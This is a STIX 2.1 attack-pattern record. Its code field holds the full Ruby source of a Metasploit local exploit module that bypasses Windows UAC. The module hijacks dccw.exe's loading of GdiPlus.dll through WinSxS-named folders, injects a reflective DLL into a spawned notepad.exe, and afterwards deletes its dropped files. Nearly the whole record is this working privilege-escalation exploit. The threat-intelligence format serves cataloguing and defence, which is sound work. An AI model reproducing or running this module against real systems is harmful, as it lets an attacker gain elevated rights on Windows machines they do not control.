{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7c1481f8-9bd1-4a63-b082-7ef0355ff8f9",
    "created": "2024-08-14T16:49:14.508227Z",
    "modified": "2024-08-14T16:49:14.508231Z",
    "name": "Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS",
    "description": " This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off by abusing the way \"WinSxS\" works in Windows systems. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three seperate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac_injection_winsxs.rb",
            "external_id": "bypassuac_injection_winsxs.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/L3cr0f/DccwBypassUAC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Exploit::EXE\n  include Exploit::FileDropper\n  include Post::File\n  include Post::Windows::Priv\n  include Post::Windows::ReflectiveDLLInjection\n  include Post::Windows::Runas\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS',\n        'Description' => %q{\n          This module will bypass Windows UAC by utilizing the trusted publisher\n          certificate through process injection. It will spawn a second shell that\n          has the UAC flag turned off by abusing the way \"WinSxS\" works in Windows\n          systems. This module uses the Reflective DLL Injection technique to drop\n          only the DLL payload binary instead of three seperate binaries in the\n          standard technique. However, it requires the correct architecture to be\n          selected, (use x64 for SYSWOW64 systems also).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ernesto Fernandez \"L3cr0f\" <ernesto.fernpro[at]gmail.com>'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          ['URL', 'https://github.com/L3cr0f/DccwBypassUAC']\n        ],\n        'DisclosureDate' => '2017-04-06',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_dir\n              stdapi_fs_delete_file\n              stdapi_fs_stat\n              stdapi_railgun_api\n              stdapi_sys_process_attach\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_write\n              stdapi_sys_process_thread_create\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def exploit\n    # Validate that we can actually do things before we bother\n    # doing any more work\n    validate_environment!\n    check_permissions!\n\n    # Get all required environment variables in one shot instead. This\n    # is a better approach because we don't constantly make calls through\n    # the session to get the variables.\n    env_vars = get_envs('TEMP', 'WINDIR')\n\n    # Get UAC level so as to verify if the module will be successful\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    dll_path = bypass_dll_path\n    payload_filepath = \"#{env_vars['TEMP']}\\\\dccw.exe.Local\"\n\n    # Establish the folder pattern so as to get those folders that match it\n    sysarch = sysinfo['Architecture']\n    if sysarch == ARCH_X86\n      targetedDirectories = 'C:\\\\Windows\\\\WinSxS\\\\x86_microsoft.windows.gdiplus_*'\n    else\n      targetedDirectories = 'C:\\\\Windows\\\\WinSxS\\\\amd64_microsoft.windows.gdiplus_*'\n    end\n\n    directoryNames = get_directories(payload_filepath, targetedDirectories)\n    create_directories(payload_filepath, directoryNames)\n    upload_payload_dll(payload_filepath, directoryNames)\n\n    pid = spawn_inject_proc(env_vars['WINDIR'])\n\n    file_paths = get_file_paths(env_vars['WINDIR'], payload_filepath)\n    run_injection(pid, dll_path, file_paths)\n  end\n\n  # Path to the bypassuac binary and architecture payload checking\n  def bypass_dll_path\n    path = ::File.join(Msf::Config.data_directory, 'post')\n\n    sysarch = sysinfo['Architecture']\n    if sysarch == ARCH_X86\n      if (target_arch.first =~ /64/i) || (payload_instance.arch.first =~ /64/i)\n        fail_with(Failure::BadConfig, 'x64 Target Selected for x86 System')\n      else\n        ::File.join(path, 'bypassuac-x86.dll')\n      end\n    elsif (target_arch.first =~ /64/i) && (payload_instance.arch.first =~ /64/i)\n      ::File.join(path, 'bypassuac-x64.dll')\n    else\n      fail_with(Failure::BadConfig, 'x86 Target Selected for x64 System')\n    end\n  end\n\n  # Check if the compromised user matches some requirements\n  def check_permissions!\n    # Check if you are an admin\n    vprint_status('Checking admin status...')\n    admin_group = is_in_admin_group?\n\n    if admin_group.nil?\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    elsif admin_group\n      print_good('Part of Administrators group! Continuing...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n    end\n  end\n\n  # Inject and run the DLL within a trusted certificate signed process to invoke IFileOperation\n  def run_injection(pid, dll_path, file_paths)\n    vprint_status(\"Injecting #{datastore['DLL_PATH']} into process ID #{pid}\")\n    begin\n      path_struct = create_struct(file_paths)\n\n      vprint_status(\"Opening process #{pid}\")\n      host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)\n      exploit_mem, offset = inject_dll_into_process(host_process, dll_path)\n\n      vprint_status(\"Injecting struct into #{pid}\")\n      struct_addr = host_process.memory.allocate(path_struct.length)\n      host_process.memory.write(struct_addr, path_struct)\n\n      vprint_status('Executing payload')\n      thread = host_process.thread.create(exploit_mem + offset, struct_addr)\n      print_good(\"Successfully injected payload in to process: #{pid}\")\n      client.railgun.kernel32.WaitForSingleObject(thread.handle, 14000)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Failed to Inject Payload to #{pid}!\")\n      vprint_error(e.to_s)\n    end\n  end\n\n  # Create a process in the native architecture\n  def spawn_inject_proc(win_dir)\n    print_status('Spawning process with Windows Publisher Certificate, to inject into...')\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      cmd = \"#{win_dir}\\\\sysnative\\\\notepad.exe\"\n    else\n      cmd = \"#{win_dir}\\\\System32\\\\notepad.exe\"\n    end\n    pid = cmd_exec_get_pid(cmd)\n\n    unless pid\n      fail_with(Failure::Unknown, 'Spawning Process failed...')\n    end\n\n    pid\n  end\n\n  # Upload only one DLL, the rest will be copied into the specific folders\n  def upload_payload_dll(_payload_filepath, directoryNames)\n    dllPath = \"#{directoryNames[0]}\\\\GdiPlus.dll\"\n    payload = generate_payload_dccw_gdiplus_dll({ dll_exitprocess: true })\n    print_status('Uploading the Payload DLL to the filesystem...')\n    begin\n      vprint_status(\"Payload DLL #{payload.length} bytes long being uploaded...\")\n      write_file(dllPath, payload)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::Unknown, \"Error uploading file #{directoryNames[0]}: #{e.class} #{e}\")\n    end\n\n    if directoryNames.size > 1\n      copy_payload_dll(directoryNames, dllPath)\n    end\n  end\n\n  # Copy our DLL to all created folders, the first folder already have a copy of the DLL\n  def copy_payload_dll(directoryNames, dllPath)\n    1.step(directoryNames.size - 1, 1) do |i|\n      if client.railgun.kernel32.CopyFileA(dllPath, \"#{directoryNames[i]}\\\\GdiPlus.dll\", false)['return'] == false\n        print_error('Error! Cannot copy the payload to all the necessary folders! Continuing just in case it works...')\n      end\n    end\n  end\n\n  # Check if the environment is vulnerable to the exploit\n  def validate_environment!\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n\n    version = get_version_info\n    if (!version.windows_server? && version.build_number >= Msf::WindowsVersion::Win8) ||\n       (version.windows_server? && version.build_number.between?(Msf::WindowsVersion::Server2016, Msf::WindowsVersion::Server2019))\n      print_good(\"#{version.product_name} may be vulnerable.\")\n    else\n      fail_with(Failure::NotVulnerable, \"#{version.product_name} is not vulnerable.\")\n    end\n\n    if is_uac_enabled?\n      print_status('UAC is Enabled, checking level...')\n    else\n      unless is_in_admin_group?\n        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n      end\n    end\n  end\n\n  # Creating the necessary directories to perform the DLL hijacking\n  # Since we don't know which path \"dccw.exe\" will choose, we create\n  # all the directories that match with the initial pattern\n  def create_directories(payload_filepath, directoryNames)\n    env_vars = get_envs('TEMP')\n\n    print_status('Creating temporary folders...')\n    if client.railgun.kernel32.CreateDirectoryA(payload_filepath, nil)['return'] == 0\n      fail_with(Failure::Unknown, \"Cannot create the directory \\\"#{env_vars['TEMP']}dccw.exe.Local\\\"\")\n    end\n\n    directoryNames.each do |dirName|\n      if client.railgun.kernel32.CreateDirectoryA(dirName, nil)['return'] == 0\n        fail_with(Failure::Unknown, \"Cannot create the directory \\\"#{env_vars['TEMP']}dccw.exe.Local\\\\#{dirName}\\\"\")\n      end\n    end\n  end\n\n  # Get all the directories that match with the initial pattern\n  def get_directories(payload_filepath, targetedDirectories)\n    directoryNames = []\n    findFileDataSize = 592\n    maxPath = client.railgun.const('MAX_PATH')\n    fileNamePadding = 44\n\n    hFile = client.railgun.kernel32.FindFirstFileA(targetedDirectories, findFileDataSize)\n    if hFile['return'] == client.railgun.const('INVALID_HANDLE_VALUE')\n      fail_with(Failure::Unknown, 'Cannot get the targeted directories!')\n    end\n\n    findFileData = hFile['lpFindFileData']\n    moreFiles = true\n    until moreFiles == false\n      fileAttributes = findFileData[0, 4].unpack('V').first\n      andOperation = fileAttributes & client.railgun.const('FILE_ATTRIBUTE_DIRECTORY')\n      if andOperation\n        # Removes the remainder part composed of 'A' of the path and the last null character\n        normalizedData = findFileData[fileNamePadding, fileNamePadding + maxPath].split(\"\\x00\", 2).first\n        path = \"#{payload_filepath}\\\\#{normalizedData}\"\n        directoryNames.push(path)\n      end\n\n      findNextFile = client.railgun.kernel32.FindNextFileA(hFile['return'], findFileDataSize)\n      moreFiles = findNextFile['return']\n      findFileData = findNextFile['lpFindFileData']\n    end\n    client.railgun.kernel32.FindClose(hFile['return'])\n\n    if findNextFile['GetLastError'] != client.railgun.const('ERROR_NO_MORE_FILES')\n      fail_with(Failure::Unknown, 'Cannot get the targeted directories!')\n    end\n\n    directoryNames\n  end\n\n  # Store the necessary paths into a struct\n  def get_file_paths(win_path, payload_filepath)\n    paths = {}\n    paths[:szElevDll] = 'dccw.exe.Local'\n    paths[:szElevDir] = \"#{win_path}\\\\System32\"\n    paths[:szElevDirSysWow64] = \"#{win_path}\\\\sysnative\"\n    paths[:szElevExeFull] = \"#{paths[:szElevDir]}\\\\dccw.exe\"\n    paths[:szElevDllFull] = \"#{paths[:szElevDir]}\\\\#{paths[:szElevDll]}\"\n    paths[:szTempDllPath] = payload_filepath\n\n    paths\n  end\n\n  # Creates the paths struct which contains all the required paths\n  # the dll needs to copy/execute etc.\n  def create_struct(paths)\n    # Write each path to the structure in the order they\n    # are defined in the bypass uac binary.\n    struct = ''\n    struct << fill_struct_path(paths[:szElevDir])\n    struct << fill_struct_path(paths[:szElevDirSysWow64])\n    struct << fill_struct_path(paths[:szElevDll])\n    struct << fill_struct_path(paths[:szElevDllFull])\n    struct << fill_struct_path(paths[:szElevExeFull])\n    struct << fill_struct_path(paths[:szTempDllPath])\n\n    struct\n  end\n\n  def fill_struct_path(path)\n    path = Rex::Text.to_unicode(path)\n    path + \"\\x00\" * (520 - path.length)\n  end\n\n  # When a new session is obtained, it removes the dropped elements (files and folders)\n  def on_new_session(session)\n    if session.type == 'meterpreter' && !session.ext.aliases.include?('stdapi')\n      session.core.use('stdapi')\n    end\n    remove_dropped_elements(session)\n  end\n\n  # Remove all the created and dropped files and folders\n  def remove_dropped_elements(session)\n    droppedElements = []\n\n    env_vars = get_envs('TEMP', 'WINDIR')\n    payload_filepath = \"#{env_vars['TEMP']}\\\\dccw.exe.Local\"\n\n    sysarch = sysinfo['Architecture']\n    if sysarch == ARCH_X86\n      targetedDirectories = 'C:\\\\Windows\\\\WinSxS\\\\x86_microsoft.windows.gdiplus_*'\n    else\n      targetedDirectories = 'C:\\\\Windows\\\\WinSxS\\\\amd64_microsoft.windows.gdiplus_*'\n    end\n\n    directoryNames = get_directories(payload_filepath, targetedDirectories)\n    file_paths = get_file_paths(env_vars['WINDIR'], payload_filepath)\n\n    # Remove all dropped elements (files and folders)\n    remove_dlls(session, directoryNames, file_paths, droppedElements)\n    remove_winsxs_folders(session, directoryNames, file_paths, droppedElements)\n    remove_dot_local_folders(session, file_paths, droppedElements)\n\n    # Check if the removal was successful\n    removal_checking(droppedElements)\n  end\n\n  # Remove \"GdiPlus.dll\" from \"C:\\%TEMP%\\dccw.exe.Local\\*_microsoft.windows.gdiplus_*\\\"\n  # and \"C:\\Windows\\System32\\dccw.exe.Local\\*_microsoft.windows.gdiplus_*\\\"\n  def remove_dlls(session, directoryNames, file_paths, droppedElements)\n    directoryNames.each do |dirName|\n      directoryName = dirName.split('\\\\').last\n\n      begin\n        droppedElements.push(\"#{dirName}\\\\GdiPlus.dll\")\n        session.fs.file.rm(\"#{dirName}\\\\GdiPlus.dll\")\n      rescue ::Rex::Post::Meterpreter::RequestError => e\n        vprint_error(\"Error => #{e.class} - #{e}\")\n      end\n\n      begin\n        droppedElements.push(\"#{file_paths[:szElevDllFull]}\\\\#{directoryName}\\\\GdiPlus.dll\")\n        session.fs.file.rm(\"#{file_paths[:szElevDllFull]}\\\\#{directoryName}\\\\GdiPlus.dll\")\n      rescue ::Rex::Post::Meterpreter::RequestError => e\n        vprint_error(\"Error => #{e.class} - #{e}\")\n      end\n    end\n  end\n\n  # Remove folders from \"C:\\%TEMP%\\dccw.exe.Local\\\" and \"C:\\Windows\\System32\\dccw.exe.Local\\\"\n  def remove_winsxs_folders(session, directoryNames, file_paths, droppedElements)\n    directoryNames.each do |dirName|\n      directoryName = dirName.split('\\\\').last\n\n      begin\n        droppedElements.push(dirName)\n        session.fs.dir.rmdir(dirName)\n      rescue ::Rex::Post::Meterpreter::RequestError => e\n        vprint_error(\"Error => #{e.class} - #{e}\")\n      end\n\n      begin\n        droppedElements.push(\"#{file_paths[:szElevDllFull]}\\\\#{directoryName}\")\n        session.fs.dir.rmdir(\"#{file_paths[:szElevDllFull]}\\\\#{directoryName}\")\n      rescue ::Rex::Post::Meterpreter::RequestError => e\n        vprint_error(\"Error => #{e.class} - #{e}\")\n      end\n    end\n  end\n\n  # Remove \"C:\\Windows\\System32\\dccw.exe.Local\" folder\n  def remove_dot_local_folders(session, file_paths, droppedElements)\n    begin\n      droppedElements.push(file_paths[:szTempDllPath])\n      session.fs.dir.rmdir(file_paths[:szTempDllPath])\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      vprint_error(\"Error => #{e.class} - #{e}\")\n    end\n\n    begin\n      droppedElements.push(file_paths[:szElevDllFull])\n      session.fs.dir.rmdir(file_paths[:szElevDllFull])\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      vprint_error(\"Error => #{e.class} - #{e}\")\n    end\n  end\n\n  # Check if have been successfully removed\n  def removal_checking(droppedElements)\n    successfullyRemoved = true\n\n    droppedElements.each do |element|\n      stat = session.fs.file.stat(element)\n      if stat\n        print_error(\"Unable to delete #{element}!\")\n        successfullyRemoved = false\n      end\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      vprint_error(\"Error => #{e.class} - #{e}\")\n    end\n\n    if successfullyRemoved\n      print_good('All the dropped elements have been successfully removed')\n    else\n      print_warning('Could not delete some dropped elements! They will require manual cleanup on the target')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-06",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}